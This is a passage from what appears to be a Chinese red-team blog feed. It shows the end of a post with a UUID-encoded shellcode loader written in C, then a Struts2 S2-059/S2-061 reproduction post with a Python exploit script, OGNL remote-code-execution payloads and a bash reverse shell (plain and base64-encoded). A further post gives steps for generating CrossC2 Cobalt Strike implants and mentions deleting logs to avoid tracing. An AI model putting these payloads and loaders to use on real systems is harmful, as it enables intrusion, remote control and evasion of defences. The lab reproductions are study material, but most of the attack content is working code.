UUID(bytes_le=byteString)</span><br><span class="line">    offset+=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">    out += <span class="string">&quot;\&quot;&#123;&#125;\&quot;,\n&quot;</span>.format(uuid)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> outputMapping:</span><br><span class="line">        print(<span class="string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.format(byteString, uuid))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(out)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Outputted to: &#123;&#125;&quot;</span>.format(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>))</span><br></pre></td></tr></table></figure><p>生成测试样本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * buf[] = &#123;</span><br><span class="line"><span class="string">&quot;4baf01bd-dbdd-d9de-7424-f45a33c9b131&quot;</span>,</span><br><span class="line"><span class="string">&quot;83136a31-04c2-6a03-0e4d-be21f81341da&quot;</span>,</span><br><span class="line"><span class="string">&quot;3fcb73f8-b3c9-34af-7904-bb1975efe989&quot;</span>,</span><br><span class="line"><span class="string">&quot;bd259d0e-28a7-f010-3800-6093ba5bb573&quot;</span>,</span><br><span class="line"><span class="string">&quot;72c89383-cec4-2621-9d85-94d7aad02453&quot;</span>,</span><br><span class="line"><span class="string">&quot;802cf5e0-f4b0-171d-cbae-bd9918dbf781&quot;</span>,</span><br><span class="line"><span class="string">&quot;394ee67d-9cb5-eb50-845d-fed229acfe13&quot;</span>,</span><br><span class="line"><span class="string">&quot;6a754f8d-f2ee-a98e-8d28-1a2a35babc96&quot;</span>,</span><br><span class="line"><span class="string">&quot;5c5a6fc4-c4ca-3a28-cedb-fd30ea500097&quot;</span>,</span><br><span class="line"><span class="string">&quot;3327227b-f020-6246-8c57-76746f07d2fe&quot;</span>,</span><br><span class="line"><span class="string">&quot;5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68&quot;</span>,</span><br><span class="line"><span class="string">&quot;bad08a62-64c7-e79b-61ed-4272307075a8&quot;</span>,</span><br><span class="line"><span class="string">&quot;59f68d76-6a06-2be6-0336-a0c0792745e7&quot;</span>,</span><br><span class="line"><span class="string">&quot;844c482e-dab1-650c-545b-b67900000000&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dwNum = <span class="keyword">sizeof</span>(buf) / <span class="keyword">sizeof</span>(buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">PVOID pMemory = HeapAlloc(hMemory, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">DWORD_PTR CodePtr = (DWORD_PTR)pMemory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; dwNum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (CodePtr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">RPC_STATUSstatus = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);</span><br><span class="line"><span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">CodePtr += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, <span class="literal">NULL</span>) == FALSE) &#123;</span><br><span class="line"><span class="comment">// 加载成功</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Windows-CALL-BACK-函数"><a href="#Windows-CALL-BACK-函数" class="headerlink" title="Windows CALL BACK 函数"></a>Windows CALL BACK 函数</h2><p>CALL BACK意为回调，是定义一个函数，由系统某个事件或用户的动作自动触发的函数，因此调用者不是用户。</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HINTERNET hOpen;                       <span class="comment">// Root HINTERNET handle</span></span><br><span class="line">INTERNET_STATUS_CALLBACK iscCallback;  <span class="comment">// Holds the callback function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the root HINTERNET handle.</span></span><br><span class="line">hOpen = InternetOpen( TEXT(<span class="string">&quot;Test Application&quot;</span>),</span><br><span class="line">                      INTERNET_OPEN_TYPE_PRECONFIG,</span><br><span class="line">                      <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the status callback function.</span></span><br><span class="line">iscCallback = InternetSetStatusCallback( hOpen, (INTERNET_STATUS_CALLBACK)CallMaster );</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> CALLBACK <span class="title">CallMaster</span><span class="params">( HINTERNET,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD_PTR,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果CallMaster指向的是一块可执行属性的内存，那么就可以加载Shellcode。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果真要走红队免杀这块，Windows 核心编程、Windows 操作系统相关的东西那必须非常熟练才行。</p><p>路漫漫……不要急于求成……</p><p>代码都没有本地测试，只是先了解了一下常见的方法。明天或者有空了在虚拟机里面用vs测试。mac版的vs没法编译c/c++。clion 也没有，没有 windows.h 这个头文件。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220232131.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;了解了解&lt;/p&gt;</summary>
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>漏洞复现：S2-059&amp;061远程代码执行漏洞(CVE-2019-0230&amp;CVE-2020-17430)</title>
    <link href="https://hack-for.fun/9316.html"/>
    <id>https://hack-for.fun/9316.html</id>
    <published>2021-02-17T16:45:37.000Z</published>
    <updated>2021-02-18T02:32:37.278Z</updated>
    
    <content type="html"><![CDATA[<p>Struts2的洞一般都是OGNL表达式注入，以及对其沙盒绕过</p><a id="more"></a><h1 id="S2-059"><a href="#S2-059" class="headerlink" title="S2-059"></a>S2-059</h1><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行<strong>二次解析</strong>，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p><p>影响版本: Struts 2.0.0 - Struts 2.5.20</p><p>阿里云VPS 会自带阿里云盾，所以每一台阿里云VPS，都是阿里云的蜜罐了么。。自己复现都么法，自己把自己waf了，网站都打不开。</p><p>访问 <code>http://your-ip:8080/?id=%25%7B233*233%7D</code>，可以发现233*233的结果被解析到了id属性中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;touch /tmp/success&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure><h1 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Vulhub:</p><p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-061">https://github.com/vulhub/vulhub/tree/master/struts2/s2-061</a></p><p>Struts2: </p><p>2.5.25 </p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>此次漏洞只是S2-059修复的一个绕过，并且本次利用的核心类<code>org.apache.commons.collections.BeanMap</code>在commons-collections-x.x.jar包中，但是在官方的最小依赖包中并没有包含这个包。所以即使扫到了支持OGNL表达式的注入点，如果没有使用这个依赖包，也还是没办法进行利用</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p><strong>S2-061是对S2-059的绕过</strong>，Struts2官方对S2-059的修复方式是<strong>加强OGNL表达式沙盒</strong>，而S2-061绕过了该沙盒。</p><p>该漏洞影响版本范围是Struts 2.0.0到Struts 2.5.25。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h3><p>POST请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">boundary&#x3D;----WebKitFormBoundary0qcU8KvOhouvJWrH</span><br><span class="line">Content-Length: 829</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary0qcU8KvOhouvJWrH</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundary0qcU8KvOhouvJWrH--</span><br></pre></td></tr></table></figure><p>执行命令在 <code>(#arglist.add(&quot;id&quot;)).</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103019.png"></p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h3><p>反弹shell</p><p>使用bash反弹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103020.png"></p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p>Java 漏洞利用，常常需要注意编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 918</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF-</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103021.png"></p><p>还有很多，不一一复现了。一个回显用来验证，一个反弹shell用来利用。可能实战遇到了，要么很好利用，要么就是各种WAF，RASP…</p><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a href="https://xz.aliyun.com/t/8689">https://xz.aliyun.com/t/8689</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-061/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-061/README.zh-cn.md</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Struts2的洞一般都是OGNL表达式注入，以及对其沙盒绕过&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Struts2" scheme="https://hack-for.fun/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>最近的一点渗透学习总结</title>
    <link href="https://hack-for.fun/33ed.html"/>
    <id>https://hack-for.fun/33ed.html</id>
    <published>2021-02-17T15:54:47.000Z</published>
    <updated>2021-02-17T16:39:47.912Z</updated>
    
    <content type="html"><![CDATA[<p>曾经以为知道点皮毛就够了。</p><a id="more"></a><p>太多了，就在本地Mweb里面放着。暂时没搞 mweb 同步 hexo blog。就只截图 toc部分，感兴趣的师傅可以一起交流交流，还得多实操。</p><p>基本是按照daiker师傅的作品来学的，大部分也是C/V，还没有更多的个人补充。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218002655.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218002656.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218002657.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218002658.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218002659.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218002700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218002701.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;曾经以为知道点皮毛就够了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>2021首场红蓝对抗红队心得</title>
    <link href="https://hack-for.fun/7d25.html"/>
    <id>https://hack-for.fun/7d25.html</id>
    <published>2021-02-03T10:35:17.000Z</published>
    <updated>2021-02-15T06:39:16.186Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="6972e3f2acdaf38c5248dbad46e1ba82fd7a824f24d3a03cc6db8dc51c27029b"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>工具使用：Pentest Box Tools以及基于此搭建自己的便携渗透工具包</title>
    <link href="https://hack-for.fun/34c7.html"/>
    <id>https://hack-for.fun/34c7.html</id>
    <published>2021-01-21T13:25:33.000Z</published>
    <updated>2021-01-24T12:38:26.337Z</updated>
    
    <content type="html"><![CDATA[<p>有时候，事情总是事与愿违。</p><a id="more"></a><p><a href="https://tools.pentestbox.org/#linux-utilities">https://tools.pentestbox.org/#linux-utilities</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;有时候，事情总是事与愿违。&lt;/p&gt;</summary>
    
    
    
    
    <category term="渗透工具" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>漏洞复现：CVE-2018-8581 &amp; Exchange SSRF &amp; NTLM 中继搞定域控(TODO)</title>
    <link href="https://hack-for.fun/c941.html"/>
    <id>https://hack-for.fun/c941.html</id>
    <published>2021-01-21T09:27:05.000Z</published>
    <updated>2021-01-23T18:15:11.522Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="84fdf6e6c252f8fc52d82316ab94e079450a2b374466863e85d7aba7a99c1c2f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="红队" scheme="https://hack-for.fun/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网渗透" scheme="https://hack-for.fun/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike：CrossC2相关知识</title>
    <link href="https://hack-for.fun/67f2.html"/>
    <id>https://hack-for.fun/67f2.html</id>
    <published>2021-01-20T13:48:21.000Z</published>
    <updated>2021-01-20T17:05:05.392Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>今天和亮亮还有豪哥提了下CS，发现我连CrossC2都还没装。。。有时候真心建议去看官方文档，别去找教程，看了几个教程全tm都是坑。。。</p></blockquote><a id="more"></a><p>具体介绍看下面</p><p><a href="https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh.md">https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh.md</a></p><p>一些限制，要cs4.1及以上。</p><ul><li>Only CS 4.x (&gt;=4.1) version is supported, lower versions will no longer be supported.</li></ul><p>简单说，CrossC2就是一个跨平台的上线，Linux、MacOS、iOS、Android。</p><blockquote><p>CrossC2 framework - 生成CobaltStrike的跨平台beacon</p></blockquote><ul><li>由于 Cross C2目前只支持HTTPS Beacon，所以在Listenrs中选择HTTPS进行监听，<br>服务端开启监听 windows/beacon_https/reverse_https 类型的beacon（强制HTTPS</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120221604.png"></p><p>如何使用？</p><ol><li>将s端的<code>.cobaltstrike.beacon_keys</code> 下载到c端目录下。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121005951.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120224454.png"></p><ol start="2"><li>将CrossC2.cna、genCrossC2.Linux两个文件复制到Cobalt Strike服务端（必须处于同一目录）</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120233334.png"></p><p>根据目标客户端，利用相应的CrossC2文件，生成上线文件（可执行文件，需要给x权限）</p><p>测试：以kali来测试。</p><p>生成上线可执行文件(木马)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[usage]: .&#x2F;genCrossC2.Linux [host] [port] [getURI] [postURI] [platform] [arch] [outputFileName]</span><br><span class="line"></span><br><span class="line">         -platform        &#39;MacOS&#39; &#x2F; &#39;Linux&#39;</span><br><span class="line">         -arch            &#39;x86&#39; &#x2F; &#39;x64&#39;</span><br><span class="line"></span><br><span class="line">[ex]:    .&#x2F;genCrossC2.Linux 10.10.10.10 40443 null null Linux x64 C2</span><br></pre></td></tr></table></figure><blockquote><p>上面这个都是老方法，非常不推荐。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121004040.png"></p><p>要记得给<code>genCrossC2.MacOS</code>  x 权限，不然没办法。。我傻逼，在这里都能卡住。</p><p>然后在kali 上运行可执行文件(木马)</p><ul><li>拿到shell之后，上传生成的可执行文件，然后运行</li><li>Stageless，命令行curl远程加载即可，不过这样可能会注意一下删除记录，否则如意被溯源</li></ul><p>我还问了下long716师傅，为什么Stageless 这种不行，结果我换个端口就好了。傻逼了</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121005007.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121003919.png"></p><p>成功上线。</p><p>当然不仅仅这些。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;今天和亮亮还有豪哥提了下CS，发现我连CrossC2都还没装。。。有时候真心建议去看官方文档，别去找教程，看了几个教程全tm都是坑。。。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CobaltStrike" scheme="https://hack-for.fun/tags/CobaltStrike/"/>
    
  </entry>
  
  <entry>
    <title>必会技术：MacOS下如何对移动端APP抓包测试</title>
    <link href="https://hack-for.fun/84a4.html"/>
    <id>https://hack-for.fun/84a4.html</id>
    <published>2021-01-20T06:43:57.000Z</published>
    <updated>2021-01-20T17:24:29.446Z</updated>
    
    <content type="html"><![CDATA[<p>常规渗透测试时，肯定不可能少对移动端APP、微信小程序等进行测试。这一块，还停留在最基础的水平。</p><a id="more"></a><p>相关的资料：</p><ul><li><p><a href="http://jianlei.github.io/archives/c4bd228f.html%EF%BC%88%E4%BC%A0%E7%BB%9F%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95%EF%BC%8C%E9%9C%80%E8%A6%81%E6%89%8B%E6%9C%BA%E4%B8%8B%E8%BD%BDapp%EF%BC%8C%E6%89%8B%E6%9C%BA%E5%92%8C%E7%94%B5%E8%84%91%E5%9C%A8%E5%90%8C%E4%B8%80%E4%B8%AAWiFi%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%8B%E6%9C%BA%E7%AB%AF%E8%BF%98%E8%A6%81%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E4%B8%BABurpSuite%E7%9A%84%E4%BB%A3%E7%90%86IP%EF%BC%89">http://jianlei.github.io/archives/c4bd228f.html（传统抓包方法，需要手机下载app，手机和电脑在同一个WiFi下，然后手机端还要设置代理为BurpSuite的代理IP）</a></p></li><li><p><a href="https://www.cnblogs.com/Xor0ne/articles/13729697.html%EF%BC%88Proxifier">https://www.cnblogs.com/Xor0ne/articles/13729697.html（Proxifier</a> 转发模拟器流量到bp，Windows平台比较友好，奈何我是MacOS）</p></li><li><p><a href="http://sunu11.com/2019/03/31/%E8%A7%A3%E5%86%B3android%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98/">http://sunu11.com/2019/03/31/%E8%A7%A3%E5%86%B3android%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98/</a> （用的网易MuMu，但是因为上面问题，还是转向了实体机)</p></li><li><p><a 